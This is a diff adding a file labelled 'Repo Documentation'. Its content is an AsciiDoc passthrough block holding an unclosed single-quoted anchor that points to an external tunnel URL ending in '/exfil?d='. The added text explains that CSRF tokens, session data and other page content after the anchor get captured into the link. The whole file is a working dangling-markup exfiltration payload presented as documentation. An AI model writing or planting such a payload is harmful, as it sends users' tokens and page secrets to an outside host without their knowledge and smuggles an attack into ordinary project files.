@@ -1,0 +1,13 @@
+= Repo Documentation
+
+Important project info below.
+
+++++
+<a href='https://global.rel.tunnels.api.visualstudio.com/exfil?d=
+++++
+
+This content and everything after it - including any CSRF tokens, session data, or sensitive HTML attributes containing double quotes - would be captured inside the href because we used single quotes. The href only terminates at the next SINGLE quote character.
+
+Normal looking paragraph with "quoted text" that does NOT terminate the href.
+
+Another paragraph with more "double quoted" content still inside the href.
